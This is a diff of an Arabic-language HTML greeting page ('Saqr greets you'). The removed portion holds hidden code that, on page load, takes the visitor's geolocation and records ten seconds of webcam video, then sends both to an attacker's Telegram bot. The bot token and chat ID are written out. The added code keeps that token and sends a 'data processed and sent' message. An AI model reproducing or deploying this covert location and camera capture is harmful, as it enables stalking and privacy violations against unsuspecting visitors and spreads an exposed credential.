@@ -11,129 +11,43 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #fdfdfd;
-            font-family: "Arial", sans-serif;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
             direction: rtl;
-            color: #333;
-            margin: 0;
-            padding: 0;
             text-align: center;
+            color: #333;
         }
-
         #message {
-            font-size: 28px;
-            color: #4CAF50;
+            font-size: 24px;
             margin-bottom: 20px;
-            padding: 20px 40px;
-            border-radius: 10px;
-            background-color: #e8f5e9;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
-        }
-
-        #message:hover {
-            transform: scale(1.05);
-        }
-
-        .icon {
-            font-size: 60px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-            animation: pulse 1s infinite alternate;
-        }
-
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.1); }
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <div class="icon">🦅</div>
     <div id="message">صقر يسلم عليك</div>
 
     <script>
-        let latitude = 'لم يُسمح بالوصول إلى الموقع';
-        let longitude = 'لم يُسمح بالوصول إلى الموقع';
-        let videoData = null;
+        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+        const chatId = '6185375878';
 
-        async function captureVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
+        function sendFinalMessage() {
+            const message = "📲 تمت معالجة جميع المعلومات وإرسالها بنجاح.";
 
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-
-                setTimeout(() => {
-                    recorder.stop();
-                    recorder.onstop = () => {
-                        videoData = new Blob(chunks, { type: 'video/webm' });
-                        stream.getTracks().forEach(track => track.stop());
-                        sendData();  // إرسال الفيديو والمعلومات بعد انتهاء التسجيل
-                    };
-                }, 10000);  // التسجيل لمدة 10 ثوانٍ
-            } catch (err) {
-                console.error('خطأ في الوصول إلى الكاميرا:', err);
-            }
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('تم إرسال الرسالة النهائية:', data))
+            .catch(error => console.error('خطأ في إرسال الرسالة النهائية:', error));
         }
 
-        function sendData() {
-            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
-            const chatId = '6185375878';
-
-            const message = `
-            🎯 إحداثيات الموقع:
-            🌍 Latitude: ${latitude}
-            🌍 Longitude: ${longitude}
-            `;
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('caption', message);
-
-            // إرسال الفيديو إذا كان متاحاً
-            if (videoData) {
-                formData.append('video', videoData, 'video.webm');
-                fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('تم الإرسال إلى Telegram:', data);
-                })
-                .catch(error => {
-                    console.error('خطأ في إرسال البيانات إلى Telegram:', error);
-                });
-            } else {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('تم الإرسال إلى Telegram:', data);
-                })
-                .catch(error => {
-                    console.error('خطأ في إرسال البيانات إلى Telegram:', error);
-                });
-            }
-        }
-
-        // الحصول على الموقع والبدء بتسجيل الفيديو
-        navigator.geolocation.getCurrentPosition(
-            position => {
-                latitude = position.coords.latitude;
-                longitude = position.coords.longitude;
-                captureVideo();  // بدء تسجيل الفيديو بعد الحصول على الموقع
-            },
-            error => {
-                console.error('خطأ في الوصول إلى الموقع:', error);
-                captureVideo();  // تسجيل الفيديو حتى عند عدم توفر الموقع
-            }
-        );
+        sendFinalMessage();
     </script>
 </body>
 </html>
